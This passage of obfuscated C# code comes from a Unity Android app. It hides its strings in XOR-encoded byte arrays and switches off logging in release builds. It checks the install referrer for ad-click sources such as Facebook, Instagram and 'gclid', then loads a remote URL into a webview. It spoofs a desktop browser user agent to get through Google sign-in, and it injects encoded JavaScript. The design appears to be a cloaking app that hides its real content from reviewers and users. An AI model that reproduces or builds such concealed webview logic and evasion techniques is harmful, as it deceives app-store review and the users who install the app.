            _0xf17f22c0 = _0x9df718e6.GetUserAgent();
        if (string.IsNullOrEmpty(_0xf17f22c0))
            return string.Empty;
        string _0xad12d56f = Regex.Replace(_0xf17f22c0, _0x1d049fc9._0x8f92ce0a(new byte[11] { 143, 160, 249, 232, 143, 160, 249, 164, 165, 143, 177 }, 211), string.Empty);
        _0xad12d56f = Regex.Replace(_0xad12d56f, _0x1d049fc9._0x8f92ce0a(new byte[15] { 174, 129, 217, 176, 135, 155, 158, 150, 221, 169, 172, 201, 219, 175, 217 }, 242), string.Empty);
        _0xad12d56f = Regex.Replace(_0xad12d56f, _0x1d049fc9._0x8f92ce0a(new byte[15] { 123, 72, 95, 94, 68, 66, 67, 2, 25, 113, 3, 29, 113, 94, 7 }, 45), string.Empty);
        return Regex.Replace(_0xad12d56f, _0x1d049fc9._0x8f92ce0a(new byte[6] { 59, 20, 28, 85, 75, 26 }, 103), _0x1d049fc9._0x8f92ce0a(new byte[1] { 71 }, 103)).Trim();
    }

    private bool _0x94cf20fe = false;
    private int _0xf83b9c5c = 5, _0x9744bd56 = 5, _0xb7874c60 = 5, _0x5a3f5416 = 5;
    private RectTransform _0xe0331d22;
    private void Awake()
    {
        if (_0xd55456c5 != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0xd55456c5 = gameObject.GetComponent<_0x6de4ac9a>();
        DontDestroyOnLoad(gameObject);
        _0x2575549b = _0xd7999165 = _0xaefb46b5 = "";
        _0x550ba06c = "";
        _0x4096132e = false;
    }

    private void _0x18365448()
    {
        using (var _0x1f8dce58 = new AndroidJavaClass(_0x1d049fc9._0x8f92ce0a(new byte[30] { 108, 96, 98, 33, 122, 97, 102, 123, 118, 60, 107, 33, 127, 99, 110, 118, 106, 125, 33, 90, 97, 102, 123, 118, 95, 99, 110, 118, 106, 125 }, 15)))
        using (var _0x55d7e915 = _0x1f8dce58.GetStatic<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[15] { 197, 211, 212, 212, 195, 200, 210, 231, 197, 210, 207, 208, 207, 210, 223 }, 166)))
        using (var _0x2e758725 = _0x55d7e915.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[9] { 33, 35, 50, 15, 40, 50, 35, 40, 50 }, 70)))
        {
            if (_0x2e758725 == null)
                return;
            using (var _0xf4cc2ed1 = _0x2e758725.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[9] { 110, 108, 125, 76, 113, 125, 123, 104, 122 }, 9)))
            {
                if (_0xf4cc2ed1 == null)
                    return;
                using (var _0xa07367aa = new AndroidJavaObject(_0x1d049fc9._0x8f92ce0a(new byte[19] { 73, 84, 65, 8, 76, 85, 73, 72, 8, 108, 117, 105, 104, 105, 68, 76, 67, 69, 82 }, 38)))
                using (var _0x875a6af2 = _0xf4cc2ed1.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[6] { 65, 79, 83, 121, 79, 94 }, 42)))
                using (var _0x08e16893 = _0x875a6af2.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[8] { 225, 252, 237, 250, 233, 252, 231, 250 }, 136)))
                {
                    while (_0x08e16893.Call<bool>(_0x1d049fc9._0x8f92ce0a(new byte[7] { 157, 148, 134, 187, 144, 141, 129 }, 245)))
                    {
                        string _0x7e91a302 = _0x08e16893.Call<string>(_0x1d049fc9._0x8f92ce0a(new byte[4] { 23, 28, 1, 13 }, 121));
                        using (var _0x0666b884 = _0xf4cc2ed1.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[3] { 1, 3, 18 }, 102), _0x7e91a302))
                        {
                            _0xa07367aa.Call<AndroidJavaObject>(_0x1d049fc9._0x8f92ce0a(new byte[3] { 148, 145, 144 }, 228), _0x7e91a302, _0x0666b884);
                        }
                    }

                    string _0xc77bc19d = _0xa07367aa.Call<string>(_0x1d049fc9._0x8f92ce0a(new byte[8] { 132, 159, 163, 132, 130, 153, 158, 151 }, 240));
                    if (!string.IsNullOrEmpty(_0xc77bc19d))
                    {
                        _0xae25c40c(_0xc77bc19d);
                        _0x80e8efc9(_0xc77bc19d);
                    }
                }
            }
        }
    }

    private string _0xb706b133(string _0x882743c0, string _0x8c470840)
    {
        if (string.IsNullOrEmpty(_0x8c470840))
            return _0x882743c0;
        if (_0x882743c0.Contains(_0x1d049fc9._0x8f92ce0a(new byte[1] { 11 }, 52)))
            return _0x882743c0 + _0x1d049fc9._0x8f92ce0a(new byte[8] { 59, 110, 120, 115, 121, 116, 121, 32 }, 29) + UnityWebRequest.EscapeURL(_0x8c470840);
        else
            return _0x882743c0 + _0x1d049fc9._0x8f92ce0a(new byte[8] { 212, 152, 142, 133, 143, 130, 143, 214 }, 235) + UnityWebRequest.EscapeURL(_0x8c470840);
    }

    private IEnumerator _0x0b24764e()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[26] { 188, 179, 130, 148, 147, 186, 199, 174, 137, 142, 147, 142, 134, 139, 142, 157, 130, 181, 130, 129, 129, 130, 149, 130, 149, 199 }, 231));
            }
#endif
        }

        bool _0xf3747545 = false;
        InstallReferrer.GetReferrer((_0xbe7064db) =>
        {
            Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[24] { 224, 239, 222, 200, 207, 155, 233, 222, 221, 222, 201, 201, 222, 201, 230, 155, 220, 222, 207, 155, 89, 61, 41, 155 }, 187) + _0x68b91c10);
            if (_0xbe7064db.IsSuccess)
            {
                _0x68b91c10 = _0xbe7064db.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[28] { 146, 157, 172, 186, 189, 233, 155, 172, 175, 172, 187, 187, 172, 187, 148, 233, 154, 188, 170, 170, 172, 186, 186, 233, 43, 79, 91, 233 }, 201) + _0x68b91c10);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[27] { 48, 63, 14, 24, 31, 75, 57, 14, 13, 14, 25, 25, 14, 25, 54, 75, 45, 10, 2, 7, 14, 15, 75, 137, 237, 249, 75 }, 107) + _0xbe7064db);
#endif
                }

                _0x68b91c10 = "";
            }

            _0xc1c72a84 = true;
        });
        StartCoroutine(_0xbca728f6(2f));
        yield return new WaitUntil(() => _0xc1c72a84);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0x68b91c10}");
#endif
        }

        bool _0xb5886004 = _0x68b91c10.Contains(_0x1d049fc9._0x8f92ce0a(new byte[6] { 119, 115, 124, 121, 116, 45 }, 16));
        _0xf3747545 = _0xb5886004 || _0x68b91c10.Contains(_0x1d049fc9._0x8f92ce0a(new byte[18] { 60, 45, 45, 46, 115, 52, 51, 46, 41, 60, 58, 47, 60, 48, 115, 62, 50, 48 }, 93)) || _0x68b91c10.Contains(_0x1d049fc9._0x8f92ce0a(new byte[17] { 0, 17, 17, 18, 79, 7, 0, 2, 4, 3, 14, 14, 10, 79, 2, 14, 12 }, 97));
        _0xd7999165 = _0xb5886004 ? "" : (_0xf3747545 ? "" : _0xd7999165);
        _0xd7999165 = _0xd7999165 ?? "";
        _0xaefb46b5 = _0xaefb46b5 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0xd7999165}");
#endif
        }
    }

    private IEnumerator RequestAndroidPermissionIfNeeded(string _0xfe8fe444)
    {
        if (Permission.HasUserAuthorizedPermission(_0xfe8fe444))
            yield break;
        bool _0xdf46e767 = false;
        var _0x9e381c3e = new PermissionCallbacks();
        _0x9e381c3e.PermissionGranted += _0xe7d70af6 => _0xdf46e767 = true;
        _0x9e381c3e.PermissionDenied += _0xe7d70af6 => _0xdf46e767 = true;
        Permission.RequestUserPermission(_0xfe8fe444, _0x9e381c3e);
        yield return new WaitUntil(() => _0xdf46e767);
    }

    private bool _0x416a1480(int _0xd300dc8f, string _0x15459a1f, string _0x91e6d18c)
    {
        if (string.IsNullOrEmpty(_0x91e6d18c))
            return false;
        if (!IsHttpUrl(_0x91e6d18c))
            return true;
        if (string.IsNullOrEmpty(_0x15459a1f))
            return false;
        return _0x15459a1f.IndexOf(_0x1d049fc9._0x8f92ce0a(new byte[20] { 138, 157, 157, 144, 140, 128, 129, 129, 138, 140, 155, 134, 128, 129, 144, 157, 138, 156, 138, 155 }, 207), StringComparison.OrdinalIgnoreCase) >= 0 || _0x15459a1f.IndexOf(_0x1d049fc9._0x8f92ce0a(new byte[22] { 154, 141, 141, 128, 156, 144, 145, 145, 154, 156, 139, 150, 144, 145, 128, 141, 154, 153, 138, 140, 154, 155 }, 223), StringComparison.OrdinalIgnoreCase) >= 0 || _0x15459a1f.IndexOf(_0x1d049fc9._0x8f92ce0a(new byte[21] { 111, 120, 120, 117, 105, 101, 100, 100, 111, 105, 126, 99, 101, 100, 117, 105, 102, 101, 121, 111, 110 }, 42), StringComparison.OrdinalIgnoreCase) >= 0 || _0x15459a1f.IndexOf(_0x1d049fc9._0x8f92ce0a(new byte[22] { 109, 122, 122, 119, 125, 102, 99, 102, 103, 127, 102, 119, 125, 122, 100, 119, 123, 107, 96, 109, 101, 109 }, 40), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string _0x1fd1decb()
    {
        return _0x1d049fc9._0x8f92ce0a(new byte[12] { 252, 178, 161, 186, 183, 160, 189, 187, 186, 252, 253, 175 }, 212) + _0x1d049fc9._0x8f92ce0a(new byte[8] { 33, 54, 37, 119, 34, 54, 106, 112 }, 87) + WindowsDesktopUserAgent + _0x1d049fc9._0x8f92ce0a(new byte[2] { 74, 86 }, 109) + _0x1d049fc9._0x8f92ce0a(new byte[30] { 64, 87, 68, 22, 70, 68, 89, 66, 89, 11, 120, 87, 64, 95, 81, 87, 66, 89, 68, 24, 70, 68, 89, 66, 89, 66, 79, 70, 83, 13 }, 54) + _0x1d049fc9._0x8f92ce0a(new byte[121] { 23, 4, 31, 18, 5, 24, 30, 31, 81, 21, 20, 23, 89, 30, 19, 27, 93, 26, 20, 8, 93, 7, 16, 29, 88, 10, 5, 3, 8, 10, 62, 19, 27, 20, 18, 5, 95, 21, 20, 23, 24, 31, 20, 33, 3, 30, 1, 20, 3, 5, 8, 89, 30, 19, 27, 93, 26, 20, 8, 93, 10, 22, 20, 5, 75, 23, 4, 31, 18, 5, 24, 30, 31, 89, 88, 10, 3, 20, 5, 4, 3, 31, 81, 7, 16, 29, 74, 12, 93, 18, 30, 31, 23, 24, 22, 4, 3, 16, 19, 29, 20, 75, 5, 3, 4, 20, 12, 88, 74, 12, 18, 16, 5, 18, 25, 89, 20, 88, 10, 12, 12 }, 113) + _0x1d049fc9._0x8f92ce0a(new byte[26] { 31, 30, 29, 83, 11, 9, 20, 15, 20, 87, 92, 14, 8, 30, 9, 58, 28, 30, 21, 15, 92, 87, 14, 26, 82, 64 }, 123) + _0x1d049fc9._0x8f92ce0a(new byte[130] { 150, 151, 148, 218, 130, 128, 157, 134, 157, 222, 213, 147, 130, 130, 164, 151, 128, 129, 155, 157, 156, 213, 222, 213, 199, 220, 194, 210, 218, 165, 155, 156, 150, 157, 133, 129, 210, 188, 166, 210, 195, 194, 220, 194, 201, 210, 165, 155, 156, 196, 198, 201, 210, 138, 196, 198, 219, 210, 179, 130, 130, 158, 151, 165, 151, 144, 185, 155, 134, 221, 199, 193, 197, 220, 193, 196, 210, 218, 185, 186, 166, 191, 190, 222, 210, 158, 155, 153, 151, 210, 181, 151, 145, 153, 157, 219, 210, 177, 154, 128, 157, 159, 151, 221, 195, 192, 194, 220, 194, 220, 194, 220, 194, 210, 161, 147, 148, 147, 128, 155, 221, 199, 193, 197, 220, 193, 196, 213, 219, 201 }, 242) + _0x1d049fc9._0x8f92ce0a(new byte[30] { 116, 117, 118, 56, 96, 98, 127, 100, 127, 60, 55, 96, 124, 113, 100, 118, 127, 98, 125, 55, 60, 55, 71, 121, 126, 35, 34, 55, 57, 43 }, 16) + _0x1d049fc9._0x8f92ce0a(new byte[34] { 59, 58, 57, 119, 47, 45, 48, 43, 48, 115, 120, 41, 58, 49, 59, 48, 45, 120, 115, 120, 24, 48, 48, 56, 51, 58, 127, 22, 49, 60, 113, 120, 118, 100 }, 95) + _0x1d049fc9._0x8f92ce0a(new byte[30] { 168, 169, 170, 228, 188, 190, 163, 184, 163, 224, 235, 161, 173, 180, 152, 163, 185, 175, 164, 156, 163, 165, 162, 184, 191, 235, 224, 252, 229, 247 }, 204) + _0x1d049fc9._0x8f92ce0a(new byte[449] { 198, 192, 203, 201, 196, 211, 192, 146, 199, 211, 214, 143, 201, 208, 192, 211, 220, 214, 193, 136, 233, 201, 208, 192, 211, 220, 214, 136, 149, 241, 218, 192, 221, 223, 219, 199, 223, 149, 158, 196, 215, 192, 193, 219, 221, 220, 136, 149, 131, 128, 130, 149, 207, 158, 201, 208, 192, 211, 220, 214, 136, 149, 245, 221, 221, 213, 222, 215, 146, 241, 218, 192, 221, 223, 215, 149, 158, 196, 215, 192, 193, 219, 221, 220, 136, 149, 131, 128, 130, 149, 207, 158, 201, 208, 192, 211, 220, 214, 136, 149, 252, 221, 198, 143, 243, 141, 240, 192, 211, 220, 214, 149, 158, 196, 215, 192, 193, 219, 221, 220, 136, 149, 128, 134, 149, 207, 239, 158, 223, 221, 208, 219, 222, 215, 136, 212, 211, 222, 193, 215, 158, 194, 222, 211, 198, 212, 221, 192, 223, 136, 149, 229, 219, 220, 214, 221, 197, 193, 149, 158, 213, 215, 198, 250, 219, 213, 218, 247, 220, 198, 192, 221, 194, 203, 228, 211, 222, 199, 215, 193, 136, 212, 199, 220, 209, 198, 219, 221, 220, 154, 155, 201, 192, 215, 198, 199, 192, 220, 146, 226, 192, 221, 223, 219, 193, 215, 156, 192, 215, 193, 221, 222, 196, 215, 154, 201, 211, 192, 209, 218, 219, 198, 215, 209, 198, 199, 192, 215, 136, 149, 202, 138, 132, 149, 158, 208, 219, 198, 220, 215, 193, 193, 136, 149, 132, 134, 149, 158, 223, 221, 208, 219, 222, 215, 136, 212, 211, 222, 193, 215, 158, 223, 221, 214, 215, 222, 136, 149, 149, 158, 194, 222, 211, 198, 212, 221, 192, 223, 136, 149, 229, 219, 220, 214, 221, 197, 193, 149, 158, 194, 222, 211, 198, 212, 221, 192, 223, 228, 215, 192, 193, 219, 221, 220, 136, 149, 131, 135, 156, 130, 156, 130, 149, 158, 199, 211, 244, 199, 222, 222, 228, 215, 192, 193, 219, 221, 220, 136, 149, 131, 128, 130, 156, 130, 156, 130, 156, 130, 149, 207, 155, 137, 207, 207, 137, 253, 208, 216, 215, 209, 198, 156, 214, 215, 212, 219, 220, 215, 226, 192, 221, 194, 215, 192, 198, 203, 154, 194, 192, 221, 198, 221, 158, 149, 199, 193, 215, 192, 243, 213, 215, 220, 198, 246, 211, 198, 211, 149, 158, 201, 213, 215, 198, 136, 212, 199, 220, 209, 198, 219, 221, 220, 154, 155, 201, 192, 215, 198, 199, 192, 220, 146, 199, 211, 214, 137, 207, 158, 209, 221, 220, 212, 219, 213, 199, 192, 211, 208, 222, 215, 136, 198, 192, 199, 215, 207, 155, 137, 207, 209, 211, 198, 209, 218, 154, 215, 155, 201, 207 }, 178) + _0x1d049fc9._0x8f92ce0a(new byte[112] { 159, 158, 157, 211, 136, 152, 137, 158, 158, 149, 215, 220, 140, 146, 159, 143, 147, 220, 215, 202, 194, 201, 203, 210, 192, 159, 158, 157, 211, 136, 152, 137, 158, 158, 149, 215, 220, 147, 158, 146, 156, 147, 143, 220, 215, 202, 203, 195, 203, 210, 192, 159, 158, 157, 211, 136, 152, 137, 158, 158, 149, 215, 220, 154, 141, 154, 146, 151, 172, 146, 159, 143, 147, 220, 215, 202, 194, 201, 203, 210, 192, 159, 158, 157, 211, 136, 152, 137, 158, 158, 149, 215, 220, 154, 141, 154, 146, 151, 179, 158, 146, 156, 147, 143, 220, 215, 202, 203, 207, 203, 210, 192 }, 251) + _0x1d049fc9._0x8f92ce0a(new byte[45] { 169, 175, 164, 166, 170, 180, 179, 185, 178, 170, 243, 178, 179, 169, 178, 168, 190, 181, 174, 169, 188, 175, 169, 224, 168, 179, 185, 184, 187, 180, 179, 184, 185, 230, 160, 190, 188, 169, 190, 181, 245, 184, 244, 166, 160 }, 221) + _0x1d049fc9._0x8f92ce0a(new byte[721] { 98, 100, 111, 109, 96, 119, 100, 54, 121, 100, 127, 113, 43, 97, 127, 120, 114, 121, 97, 56, 123, 119, 98, 117, 126, 91, 115, 114, 127, 119, 56, 116, 127, 120, 114, 62, 97, 127, 120, 114, 121, 97, 63, 45, 97, 127, 120, 114, 121, 97, 56, 123, 119, 98, 117, 126, 91, 115, 114, 127, 119, 43, 112, 99, 120, 117, 98, 127, 121, 120, 62, 103, 63, 109, 96, 119, 100, 54, 101, 43, 69, 98, 100, 127, 120, 113, 62, 103, 63, 56, 98, 121, 90, 121, 97, 115, 100, 85, 119, 101, 115, 62, 63, 45, 127, 112, 62, 101, 56, 127, 120, 114, 115, 110, 89, 112, 62, 49, 102, 121, 127, 120, 98, 115, 100, 44, 54, 117, 121, 119, 100, 101, 115, 49, 63, 40, 43, 38, 106, 106, 101, 56, 127, 120, 114, 115, 110, 89, 112, 62, 49, 126, 121, 96, 115, 100, 44, 54, 120, 121, 120, 115, 49, 63, 40, 43, 38, 106, 106, 101, 56, 127, 120, 114, 115, 110, 89, 112, 62, 49, 123, 119, 110, 59, 97, 127, 114, 98, 126, 49, 63, 40, 43, 38, 106, 106, 101, 56, 127, 120, 114, 115, 110, 89, 112, 62, 49, 123, 119, 110, 59, 114, 115, 96, 127, 117, 115, 59, 97, 127, 114, 98, 126, 49, 63, 40, 43, 38, 63, 100, 115, 98, 99, 100, 120, 54, 109, 123, 119, 98, 117, 126, 115, 101, 44, 112, 119, 122, 101, 115, 58, 123, 115, 114, 127, 119, 44, 103, 58, 121, 120, 117, 126, 119, 120, 113, 115, 44, 120, 99, 122, 122, 58, 119, 114, 114, 90, 127, 101, 98, 115, 120, 115, 100, 44, 112, 99, 120, 117, 98, 127, 121, 120, 62, 63, 109, 107, 58, 100, 115, 123, 121, 96, 115, 90, 127, 101, 98, 115, 120, 115, 100, 44, 112, 99, 120, 117, 98, 127, 121, 120, 62, 63, 109, 107, 58, 119, 114, 114, 83, 96, 115, 120, 98, 90, 127, 101, 98, 115, 120, 115, 100, 44, 112, 99, 120, 117, 98, 127, 121, 120, 62, 63, 109, 107, 58, 100, 115, 123, 121, 96, 115, 83, 96, 115, 120, 98, 90, 127, 101, 98, 115, 120, 115, 100, 44, 112, 99, 120, 117, 98, 127, 121, 120, 62, 63, 109, 107, 58, 114, 127, 101, 102, 119, 98, 117, 126, 83, 96, 115, 120, 98, 44, 112, 99, 120, 117, 98, 127, 121, 120, 62, 63, 109, 100, 115, 98, 99, 100, 120, 54, 112, 119, 122, 101, 115, 45, 107, 107, 45, 127, 112, 62, 101, 56, 127, 120, 114, 115, 110, 89, 112, 62, 49, 102, 121, 127, 120, 98, 115, 100, 44, 54, 112, 127, 120, 115, 49, 63, 40, 43, 38, 106, 106, 101, 56, 127, 120, 114, 115, 110, 89, 112, 62, 49, 126, 121, 96, 115, 100, 44, 54, 126, 121, 96, 115, 100, 49, 63, 40, 43, 38, 63, 100, 115, 98, 99, 100, 120, 54, 109, 123, 119, 98, 117, 126, 115, 101, 44, 98, 100, 99, 115, 58, 123, 115, 114, 127, 119, 44, 103, 58, 121, 120, 117, 126, 119, 120, 113, 115, 44, 120, 99, 122, 122, 58, 119, 114, 114, 90, 127, 101, 98, 115, 120, 115, 100, 44, 112, 99, 120, 117, 98, 127, 121, 120, 62, 63, 109, 107, 58, 100, 115, 123, 121, 96, 115, 90, 127, 101, 98, 115, 120, 115, 100, 44, 112, 99, 120, 117, 98, 127, 121, 120, 62, 63, 109, 107, 58, 119, 114, 114, 83, 96, 115, 120, 98, 90, 127, 101, 98, 115, 120, 115, 100, 44, 112, 99, 120, 117, 98, 127, 121, 120, 62, 63, 109, 107, 58, 100, 115, 123, 121, 96, 115, 83, 96, 115, 120, 98, 90, 127, 101, 98, 115, 120, 115, 100, 44, 112, 99, 120, 117, 98, 127, 121, 120, 62, 63, 109, 107, 58, 114, 127, 101, 102, 119, 98, 117, 126, 83, 96, 115, 120, 98, 44, 112, 99, 120, 117, 98, 127, 121, 120, 62, 63, 109, 100, 115, 98, 99, 100, 120, 54, 112, 119, 122, 101, 115, 45, 107, 107, 45, 100, 115, 98, 99, 100, 120, 54, 121, 100, 127, 113, 62, 103, 63, 45, 107, 45, 107, 117, 119, 98, 117, 126, 62, 115, 63, 109, 107 }, 22) + _0x1d049fc9._0x8f92ce0a(new byte[5] { 219, 143, 142, 143, 157 }, 166);
    }

    private int _0x2263a0bc = 0;
    private IEnumerator _0x5e6ad958(Dictionary<string, object> _0x3dda7937)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[30] { 244, 251, 202, 220, 219, 242, 143, 233, 202, 219, 204, 199, 143, 234, 215, 219, 221, 206, 143, 255, 218, 220, 199, 143, 235, 206, 219, 206, 149, 143 }, 175) + string.Join(_0x1d049fc9._0x8f92ce0a(new byte[1] { 13 }, 4), _0x3dda7937));
#endif
            }
        }

        string _0x640f033d = "";
        // Primary source: nested JSON under "notificationData"
        if (_0x3dda7937 != null && _0x3dda7937.TryGetValue(_0x1d049fc9._0x8f92ce0a(new byte[16] { 201, 200, 211, 206, 193, 206, 196, 198, 211, 206, 200, 201, 227, 198, 211, 198 }, 167), out var raw))
        {
            try
            {
                var _0xe2281a16 = raw?.ToString();
                var _0x45e92b4c = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xe2281a16);
                if (_0x45e92b4c != null && _0x45e92b4c.TryGetValue(_0x1d049fc9._0x8f92ce0a(new byte[6] { 246, 224, 235, 225, 236, 225 }, 133), out var val))
                {
                    _0x640f033d = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x1d049fc9._0x8f92ce0a(new byte[30] { 140, 131, 178, 164, 163, 247, 135, 162, 164, 191, 138, 247, 157, 132, 152, 153, 247, 167, 182, 165, 164, 178, 247, 178, 165, 165, 184, 165, 237, 247 }, 215) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0x640f033d) && _0x3dda7937 != null && _0x3dda7937.TryGetValue(_0x1d049fc9._0x8f92ce0a(new byte[6] { 217, 207, 196, 206, 195, 206 }, 170), out var lab))
        {
            _0x640f033d = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[38] { 171, 164, 149, 131, 132, 208, 160, 133, 131, 152, 173, 208, 182, 149, 132, 147, 152, 149, 148, 208, 131, 149, 158, 148, 153, 148, 208, 150, 130, 159, 157, 208, 154, 131, 159, 158, 202, 208 }, 240) + _0x640f033d);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0x640f033d))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[38] { 84, 91, 106, 124, 123, 47, 95, 122, 124, 103, 82, 47, 88, 110, 102, 123, 47, 123, 96, 47, 96, 127, 106, 97, 47, 120, 102, 123, 103, 47, 124, 106, 97, 107, 102, 107, 53, 47 }, 15) + _0x640f033d);
            }
#endif
        }

        _0x90d5e8fd = _0x640f033d;
        yield return new WaitUntil(() => _0x4096132e);
        var _0x660ab0df = _0x1c49d211(2, 100);
        yield return new WaitUntil(() => _0x660ab0df.IsCompleted);
        string _0x7afd51bc = _0x660ab0df.Result;
        if (!string.IsNullOrEmpty(_0x7afd51bc))
        {
            string _0x32751602 = _0xb706b133(_0x7afd51bc, _0x640f033d);
            {
#if B_LOGS
                Debug.Log(_0x1d049fc9._0x8f92ce0a(new byte[33] { 28, 19, 34, 52, 51, 103, 23, 50, 52, 47, 26, 103, 21, 34, 43, 40, 38, 35, 103, 16, 34, 37, 17, 46, 34, 48, 103, 48, 46, 51, 47, 125, 103 }, 71) + _0x32751602);
#endif
            }

            _0x9df718e6.Load(_0x32751602);
        }
    }

    private void _0x2d5c6bac(UniWebView _0xffde4370)
    {
        if (_0xccf82f1f)
            return;
        _0xccf82f1f = true;
        _0xffde4370.AddUrlScheme(_0x1d049fc9._0x8f92ce0a(new byte[2] { 109, 126 }, 25));
        _0xffde4370.AddUrlScheme(_0x1d049fc9._0x8f92ce0a(new byte[6] { 64, 71, 93, 76, 71, 93 }, 41));
        _0xffde4370.AddUrlScheme(_0x1d049fc9._0x8f92ce0a(new byte[6] { 172, 160, 179, 170, 164, 181 }, 193));
        _0xffde4370.OnMessageReceived += (_0x8cd0e0aa, _0x237f932b) =>
        {
            if (TryOpenExternalLikeChrome(_0x237f932b.RawMessage))
            {
                _0x5bb15064(false);
                return;
            }
        };
        _0xffde4370.RegisterShouldHandleRequest(_0x6b0a7028 =>
        {
            string _0x650252f8 = _0x6b0a7028 != null ? _0x6b0a7028.Url : string.Empty;
            if (string.IsNullOrEmpty(_0x650252f8))
                return true;
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[21] { 4, 63, 56, 34, 59, 51, 31, 54, 57, 51, 59, 50, 5, 50, 38, 34, 50, 36, 35, 109, 119 }, 87) + _0x650252f8);
            if (TryOpenExternalLikeChrome(_0x650252f8))
            {
                _0x5bb15064(false);
                return false;
            }

            if (_0x6b0a7028 != null && _0x6b0a7028.IsMainFrame && IsGoogleAuthFlowUrl(_0x650252f8) && !_0xf7e4abee)
            {
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[62] { 71, 107, 99, 100, 42, 93, 111, 104, 92, 99, 111, 125, 42, 110, 111, 126, 111, 105, 126, 111, 110, 42, 77, 101, 101, 109, 102, 111, 42, 107, 127, 126, 98, 42, 95, 88, 70, 42, 39, 52, 42, 120, 111, 102, 101, 107, 110, 42, 125, 99, 126, 98, 42, 77, 101, 101, 109, 102, 111, 42, 95, 75 }, 10));
                _0xf7e4abee = true;
                _0x5bb15064(true);
                _0x9df718e6.SetUserAgent(_0xf654ce05());
                _0x9df718e6.Load(_0x650252f8);
                return false;
            }

            return true;
        });
        _0xffde4370.OnLoadingErrorReceived += (_0x8cd0e0aa, _0x183b867c, _0x237f932b, _0xd44ee5e5) =>
        {
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[25] { 224, 204, 196, 195, 141, 250, 200, 207, 251, 196, 200, 218, 141, 232, 223, 223, 194, 223, 151, 141, 206, 194, 201, 200, 144 }, 173) + _0x183b867c + _0x1d049fc9._0x8f92ce0a(new byte[9] { 246, 187, 179, 165, 165, 183, 177, 179, 235 }, 214) + _0x237f932b);
            string _0x7c12c622 = GetFailingUrl(_0xd44ee5e5);
            if (string.IsNullOrEmpty(_0x7c12c622) || IsAboutBlank(_0x7c12c622))
                return;
            _ = _0xa70dc5de(_0x1d049fc9._0x8f92ce0a(new byte[8] { 17, 16, 57, 3, 20, 20, 9, 20 }, 102));
            WLog(_0x1d049fc9._0x8f92ce0a(new byte[45] { 144, 188, 180, 179, 253, 138, 184, 191, 139, 180, 184, 170, 253, 187, 188, 180, 177, 180, 179, 186, 253, 136, 143, 145, 253, 240, 227, 253, 178, 173, 184, 179, 253, 184, 165, 169, 184, 175, 179, 188, 177, 177, 164, 231, 253 }, 221) + _0x7c12c622);
            StopCurrentFailedLoad(_0x8cd0e0aa);
            _0x8f242749(_0x7c12c622);
        };
        _0xffde4370.OnPageStarted += (_0x8cd0e0aa, _0x3031a1f9) =>
        {
            _0x2263a0bc = 0;
            if (_0xd87c776b && IsAboutBlank(_0x3031a1f9))
            {
                WLog(_0x1d049fc9._0x8f92ce0a(new byte[27] { 173, 143, 152, 138, 156, 143, 144, 221, 156, 159, 146, 136, 137, 199, 159, 145, 156, 147, 150, 221, 142, 137, 156, 143, 137, 152, 153 }, 253));
                return;
            }

            WLog(_0x1d049fc9._0x8f92ce0a(new byte[29] { 25, 53, 61, 58, 116, 3, 49, 54, 2, 61, 49, 35, 116, 27, 58, 4, 53, 51, 49, 7, 32, 53, 38, 32, 49, 48, 110, 116, 127 }, 84) + (Time.realtimeSinceStartup - _0xadebe39e).ToString(_0x1d049fc9._0x8f92ce0a(new byte[5] { 2, 28, 2, 2, 2 }, 50)) + _0x1d049fc9._0x8f92ce0a(new byte[2] { 251, 168 }, 136) + _0x3031a1f9);
            if (TryOpenExternalLikeChrome(_0x3031a1f9))
            {
                StopCurrentFailedLoad(_0x8cd0e0aa);
                return;
            }

            if (ContainsIgnoreCase(_0x3031a1f9, _0x1d049fc9._0x8f92ce0a(new byte[8] { 32, 45, 45, 37, 106, 37, 52, 52 }, 68)) || ContainsIgnoreCase(_0x3031a1f9, _0x1d049fc9._0x8f92ce0a(new byte[15] { 131, 146, 138, 221, 132, 154, 151, 148, 150, 135, 221, 145, 159, 156, 148 }, 243)) || _0x3031a1f9.StartsWith(_0x1d049fc9._0x8f92ce0a(new byte[25] { 2, 30, 30, 26, 25, 80, 69, 69, 8, 26, 13, 6, 5, 8, 11, 6, 12, 11, 28, 68, 6, 3, 28, 15, 69 }, 106), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0x8cd0e0aa);
